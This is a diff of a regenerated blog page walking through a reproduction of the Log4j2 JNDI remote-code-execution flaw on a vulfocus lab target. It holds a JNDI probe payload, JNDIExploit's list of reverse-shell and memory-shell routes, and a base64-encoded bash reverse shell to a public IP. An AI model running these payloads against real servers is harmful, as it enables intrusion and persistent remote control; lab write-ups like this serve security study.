@@ -5,7 +5,9 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="log4j2远程命令执行漏洞复现（CVE-2021-44228）, hybcx&#39;s blog">
-    <meta name="description" content="">
+    <meta name="description" content="Apache log4j2 远程命令执行漏洞复现
+0x01 前言
+Apache log4j2 RCE漏洞（CVE-2021-44228）一出，各大行业知名厂商纷纷中招，与之前的fastjson、shiro漏洞相比更为严重，预计在之后的三四年">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,27 +15,48 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
     <title>log4j2远程命令执行漏洞复现（CVE-2021-44228） | hybcx&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
+    
 
-    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-    <link rel="stylesheet" type="text/css" href="/css/matery.css">
-    <link rel="stylesheet" type="text/css" href="/css/my.css">
 
-    <script src="/libs/jquery/jquery.min.js"></script>
+    <!-- bg-cover style     -->
 
-<meta name="generator" content="Hexo 6.3.0">
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
-
-
 
 
 <body>
@@ -45,7 +68,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">hybcx&#39;s blog</span>
+                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
                 </a>
             </div>
             
@@ -135,6 +158,11 @@
       <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
     </a>
   </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
 </ul>
 
 
@@ -151,8 +179,6 @@
             
         </div>
     </div>
-
-    
 
     <ul class="menu-list mobile-menu-list">
         
@@ -330,99 +356,7 @@
 <main class="post-container content">
 
     
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-<style>
-    #articleContent h1::before,
-    #articleContent h2::before,
-    #articleContent h3::before,
-    #articleContent h4::before,
-    #articleContent h5::before,
-    #articleContent h6::before {
-        display: block;
-        content: " ";
-        height: 100px;
-        margin-top: -100px;
-        visibility: hidden;
-    }
-
-    #articleContent :focus {
-        outline: none;
-    }
-
-    .toc-fixed {
-        position: fixed;
-        top: 64px;
-    }
-
-    .toc-widget {
-        width: 345px;
-        padding-left: 20px;
-    }
-
-    .toc-widget .toc-title {
-        padding: 35px 0 15px 17px;
-        font-size: 1.5rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    .toc-widget ol {
-        padding: 0;
-        list-style: none;
-    }
-
-    #toc-content {
-        padding-bottom: 30px;
-        overflow: auto;
-    }
-
-    #toc-content ol {
-        padding-left: 10px;
-    }
-
-    #toc-content ol li {
-        padding-left: 10px;
-    }
-
-    #toc-content .toc-link:hover {
-        color: #42b983;
-        font-weight: 700;
-        text-decoration: underline;
-    }
-
-    #toc-content .toc-link::before {
-        background-color: transparent;
-        max-height: 25px;
-
-        position: absolute;
-        right: 23.5vw;
-        display: block;
-    }
-
-    #toc-content .is-active-link {
-        color: #42b983;
-    }
-
-    #floating-toc-btn {
-        position: fixed;
-        right: 15px;
-        bottom: 76px;
-        padding-top: 15px;
-        margin-bottom: 0;
-        z-index: 998;
-    }
-
-    #floating-toc-btn .btn-floating {
-        width: 48px;
-        height: 48px;
-    }
-
-    #floating-toc-btn .btn-floating i {
-        line-height: 48px;
-        font-size: 1.4rem;
-    }
-</style>
-<div class="row">
+    <div class="row">
     <div id="main-content" class="col s12 m12 l9">
         <!-- 文章内容详情 -->
 <div id="artDetail">
@@ -463,12 +397,32 @@
                 
 
                 
-
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-11-12
+                </div>
                 
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    7.8k
+                </div>
+                
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    37 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
             </div>
         </div>
         <hr class="clearfix">
@@ -485,13 +439,13 @@
                 <h1>Apache log4j2 远程命令执行漏洞复现</h1>
 <h2 id="0x01-前言">0x01 前言</h2>
 <p>Apache log4j2 RCE漏洞（CVE-2021-44228）一出，各大行业知名厂商纷纷中招，与之前的fastjson、shiro漏洞相比更为严重，预计在之后的三四年中漏洞会一直存在。此漏洞影响范围特别广泛，漏洞利用门槛低，危害程度非常大，如果被攻击者恶意利用，危害程度不亚于2017年爆发的“永恒之蓝”漏洞。以下图片来源于网络</p>
-<p><img src="image-20230729172039913.png" alt="image-20230729172039913"></p>
-<p><img src="image-20230729172049681.png" alt="image-20230729172049681"></p>
-<p><img src="image-20230729172110266.png" alt="image-20230729172110266"></p>
-<p><img src="image-20230729172128853.png" alt="image-20230729172128853"></p>
-<p><img src="image-20230729172141515.png" alt="image-20230729172141515"></p>
-<p><img src="image-20230729172150957.png" alt="image-20230729172150957"></p>
-<p><img src="image-20230729172158959.png" alt="image-20230729172158959"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172039913.png" alt="image-20230729172039913"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172049681.png" alt="image-20230729172049681"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172110266.png" alt="image-20230729172110266"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172128853.png" alt="image-20230729172128853"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172141515.png" alt="image-20230729172141515"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172150957.png" alt="image-20230729172150957"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172158959.png" alt="image-20230729172158959"></p>
 <h2 id="0x02-漏洞简介">0x02 漏洞简介</h2>
 <p>Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。 由于Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。</p>
 <ul>
@@ -579,19 +533,24 @@
 </blockquote>
 <h2 id="0x04-漏洞演示">0x04 漏洞演示</h2>
 <p>演示靶场采用<a target="_blank" rel="noopener" href="http://vulfocus.fofa.so/">vulfocus</a>在线平台的log4j2-rce靶场，该靶场漏洞位置存在于/hello路径</p>
-<p><img src="image-20230729172431747.png" alt="image-20230729172431747"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172431747.png" alt="image-20230729172431747"></p>
 <p>vulfocus的log4j2-rce靶场的请求数据包如下：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GET /hello?payload=111 HTTP/1.1<br>Host: vulfocus.fofa.so:30861<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 147<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">GET /hello?payload=111 HTTP/1.1
+Host: vulfocus.fofa.so:30861
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 147<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>漏洞验证过程使用dnslog、burpsuite、JNDIExploit以及拥有公网ip的vps的服务器，建议java依赖环境采用jdk8u191以下版本进行复现。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dnslog：http://www.dnslog.cn/<br>JNDIExploit：https://github.com/feihong-cs/JNDIExploit<br>jdk8：https://www.wmzhe.com/soft-70159.html<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">dnslog：http://www.dnslog.cn/
+JNDIExploit：https://github.com/feihong-cs/JNDIExploit
+jdk8：https://www.wmzhe.com/soft-70159.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h2 id="0x05-漏洞检测">0x05 漏洞检测</h2>
 <h3 id="1-dnslog手动验证">1. dnslog手动验证</h3>
 <p>首先在dnslog平台生成一个地址，然后利用该地址构造payload让靶机对dnslog平台发起请求：</p>
-<p><img src="image-20230729172720414.png" alt="image-20230729172720414"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172720414.png" alt="image-20230729172720414"></p>
 <p>传入payload：<code>payload=%24%7Bjndi%3Aldap%3A%2F%2Fauks48.dnslog.cn%7D</code> --记得url编码</p>
-<p><img src="image-20230729180526568.png" alt="image-20230729180526568"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729180526568.png" alt="image-20230729180526568"></p>
 <p>请求成功后，dnslog平台点击 <code>Refresh Record</code> 后会接收靶机的请求，记录了靶机的请求的ip地址以及响应时间</p>
-<p><img src="image-20230729180546590.png" alt="image-20230729180546590"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729180546590.png" alt="image-20230729180546590"></p>
 <p>通过上述步骤验证，在演示靶场环境中可以确定漏洞是真实存在的，但在真实环境中只能说初步判断目标是有大概率存在漏洞的，由于真实环境中的一些复杂因素，即使dnslog请求成功了也不能完全保证目标一定存在rce漏洞。</p>
 <h3 id="2-漏洞利用">2.  漏洞利用</h3>
 <h4 id="1-JNDIExploit">1. JNDIExploit</h4>
@@ -600,13 +559,106 @@
 <li>下载地址: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1lmday3MHoPHI5f9rHNjV2Q">https://pan.baidu.com/s/1lmday3MHoPHI5f9rHNjV2Q</a> 提取码: <code>5686</code></li>
 </ul>
 <p>使用 <code>java -jar JNDIExploit.jar -u</code> 查看支持的 LDAP 格式</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Supported LADP Queries<br>* all words are case INSENSITIVE when send to ldap server<br><br>[+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g.<br>    ldap://127.0.0.1:1389/Basic/Dnslog/[domain]<br>    ldap://127.0.0.1:1389/Basic/Command/[cmd]<br>    ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd]<br>    ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported<br>    ldap://127.0.0.1:1389/Basic/TomcatEcho<br>    ldap://127.0.0.1:1389/Basic/SpringEcho<br>    ldap://127.0.0.1:1389/Basic/WeblogicEcho<br>    ldap://127.0.0.1:1389/Basic/TomcatMemshell1<br>    ldap://127.0.0.1:1389/Basic/TomcatMemshell2  ---need extra header [Shell: true]<br>    ldap://127.0.0.1:1389/Basic/JettyMemshell<br>    ldap://127.0.0.1:1389/Basic/WeblogicMemshell1<br>    ldap://127.0.0.1:1389/Basic/WeblogicMemshell2<br>    ldap://127.0.0.1:1389/Basic/JBossMemshell<br>    ldap://127.0.0.1:1389/Basic/WebsphereMemshell<br>    ldap://127.0.0.1:1389/Basic/SpringMemshell<br><br>[+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.<br>    ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain]<br>    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]<br>    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]<br>    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported<br>    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho<br>    ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho<br>    ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho<br>    ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1<br>    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1<br>    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells<br><br>[+] TomcatBypass Queries<br>    ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain]<br>    ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd]<br>    ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]<br>    ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported<br>    ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho<br>    ldap://127.0.0.1:1389/TomcatBypass/SpringEcho<br>    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1<br>    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2   ---need extra header [Shell: true]<br>    ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell<br><br>[+] GroovyBypass Queries<br>    ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd]<br>    ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]<br><br>[+] WebsphereBypass Queries<br>    ldap://127.0.0.1:1389/WebsphereBypass/List/file=[file or directory]<br>    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/[domain]<br>    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/[cmd]<br>    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]<br>    ldap://127.0.0.1:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported<br>    ldap://127.0.0.1:1389/WebsphereBypass/Upload/WebsphereMemshell<br>    ldap://127.0.0.1:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Supported LADP Queries
+* all words are case INSENSITIVE when send to ldap server
+
+[+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g.
+    ldap://127.0.0.1:1389/Basic/Dnslog/[domain]
+    ldap://127.0.0.1:1389/Basic/Command/[cmd]
+    ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd]
+    ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported
+    ldap://127.0.0.1:1389/Basic/TomcatEcho
+    ldap://127.0.0.1:1389/Basic/SpringEcho
+    ldap://127.0.0.1:1389/Basic/WeblogicEcho
+    ldap://127.0.0.1:1389/Basic/TomcatMemshell1
+    ldap://127.0.0.1:1389/Basic/TomcatMemshell2  ---need extra header [Shell: true]
+    ldap://127.0.0.1:1389/Basic/JettyMemshell
+    ldap://127.0.0.1:1389/Basic/WeblogicMemshell1
+    ldap://127.0.0.1:1389/Basic/WeblogicMemshell2
+    ldap://127.0.0.1:1389/Basic/JBossMemshell
+    ldap://127.0.0.1:1389/Basic/WebsphereMemshell
+    ldap://127.0.0.1:1389/Basic/SpringMemshell
+
+[+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
+    ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain]
+    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
+    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]
+    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
+    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho
+    ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho
+    ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho
+    ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1
+    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1
+    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells
+
+[+] TomcatBypass Queries
+    ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain]
+    ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd]
+    ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]
+    ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported
+    ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho
+    ldap://127.0.0.1:1389/TomcatBypass/SpringEcho
+    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1
+    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2   ---need extra header [Shell: true]
+    ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell
+
+[+] GroovyBypass Queries
+    ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd]
+    ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]
+
+[+] WebsphereBypass Queries
+    ldap://127.0.0.1:1389/WebsphereBypass/List/file=[file or directory]
+    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/[domain]
+    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/[cmd]
+    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]
+    ldap://127.0.0.1:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported
+    ldap://127.0.0.1:1389/WebsphereBypass/Upload/WebsphereMemshell
+    ldap://127.0.0.1:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>目前支持的所有 PayloadType 为</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Dnslog: 用于产生一个DNS请求，与 DNSLog平台配合使用，对Linux/Windows进行了简单的适配<br><br>Command: 用于执行命令，如果命令有特殊字符，支持对命令进行 Base64编码后传输<br><br>ReverseShell: 用于 Linux 系统的反弹shell，方便使用<br><br>TomcatEcho: 用于在中间件为 Tomcat 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令<br><br>SpringEcho: 用于在框架为 SpringMVC/SpringBoot 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令<br><br>WeblogicEcho: 用于在中间件为 Weblogic 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令<br><br>TomcatMemshell1: 用于植入Tomcat内存shell， 支持Behinder shell 与 Basic cmd shell<br><br>TomcatMemshell2: 用于植入Tomcat内存shell， 支持Behinder shell 与 Basic cmd shell, 使用时需要添加额外的HTTP Header<br><br>Shell: true, 推荐使用此方式<br><br>SpringMemshell: 用于植入Spring内存shell， 支持Behinder shell 与 Basic cmd shell<br><br>WeblogicMemshell1: 用于植入Weblogic内存shell， 支持Behinder shell 与 Basic cmd shell<br><br>WeblogicMemshell2: 用于植入Weblogic内存shell， 支持Behinder shell 与 Basic cmd shell，推荐使用此方式<br><br>JettyMemshell: 用于植入Jetty内存shell， 支持Behinder shell 与 Basic cmd shell<br><br>JBossMemshell: 用于植入JBoss内存shell， 支持Behinder shell 与 Basic cmd shell<br><br>WebsphereMemshell: 用于植入Websphere内存shell， 支持Behinder shell 与 Basic cmd shell<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Dnslog: 用于产生一个DNS请求，与 DNSLog平台配合使用，对Linux/Windows进行了简单的适配
+
+Command: 用于执行命令，如果命令有特殊字符，支持对命令进行 Base64编码后传输
+
+ReverseShell: 用于 Linux 系统的反弹shell，方便使用
+
+TomcatEcho: 用于在中间件为 Tomcat 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令
+
+SpringEcho: 用于在框架为 SpringMVC/SpringBoot 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令
+
+WeblogicEcho: 用于在中间件为 Weblogic 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令
+
+TomcatMemshell1: 用于植入Tomcat内存shell， 支持Behinder shell 与 Basic cmd shell
+
+TomcatMemshell2: 用于植入Tomcat内存shell， 支持Behinder shell 与 Basic cmd shell, 使用时需要添加额外的HTTP Header
+
+Shell: true, 推荐使用此方式
+
+SpringMemshell: 用于植入Spring内存shell， 支持Behinder shell 与 Basic cmd shell
+
+WeblogicMemshell1: 用于植入Weblogic内存shell， 支持Behinder shell 与 Basic cmd shell
+
+WeblogicMemshell2: 用于植入Weblogic内存shell， 支持Behinder shell 与 Basic cmd shell，推荐使用此方式
+
+JettyMemshell: 用于植入Jetty内存shell， 支持Behinder shell 与 Basic cmd shell
+
+JBossMemshell: 用于植入JBoss内存shell， 支持Behinder shell 与 Basic cmd shell
+
+WebsphereMemshell: 用于植入Websphere内存shell， 支持Behinder shell 与 Basic cmd shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>目前支持的所有 GadgetType 为</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1.URLDNS<br>2.CommonsBeanutils1<br>3.CommonsBeanutils2<br>4.CommonsCollectionsK1<br>5.CommonsCollectionsK2<br>6.C3P0<br>7.Jdk7u21<br>8.Jre8u20<br>9.CVE_2020_2551<br>10CVE_2020_2883<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">1.URLDNS
+2.CommonsBeanutils1
+3.CommonsBeanutils2
+4.CommonsCollectionsK1
+5.CommonsCollectionsK2
+6.C3P0
+7.Jdk7u21
+8.Jre8u20
+9.CVE_2020_2551
+10CVE_2020_2883<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>WebsphereBypass 中的 3 个动作：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1.list：基于XXE查看目标服务器上的目录或文件内容<br>2.upload：基于XXE的jar协议将恶意jar包上传至目标服务器的临时目录<br>3.rce：加载已上传至目标服务器临时目录的jar包，从而达到远程代码执行的效果（这一步本地未复现成功，抛4.java.lang.IllegalStateException: For application client runtime, the client factory execute on a managed server thread is not allowed.异常，有复现成功的小伙伴麻烦指导下）<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">1.list：基于XXE查看目标服务器上的目录或文件内容
+2.upload：基于XXE的jar协议将恶意jar包上传至目标服务器的临时目录
+3.rce：加载已上传至目标服务器临时目录的jar包，从而达到远程代码执行的效果（这一步本地未复现成功，抛4.java.lang.IllegalStateException: For application client runtime, the client factory execute on a managed server thread is not allowed.异常，有复现成功的小伙伴麻烦指导下）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h4 id="2-VPS部署ldap服务">2. VPS部署ldap服务</h4>
 <p>将JNDI注入工具传到vps服务器上并执行如下命令</p>
 <p>反弹shell指令：</p>
@@ -620,14 +672,16 @@
 </code></pre>
 <p>将反弹shell指令base64编码后，将一整串启动JNDI代码在vps中运行</p>
 <p>这里使用</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i}"  -A 124.220.233.26<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230729182154989.png" alt="image-20230729182154989"></p>
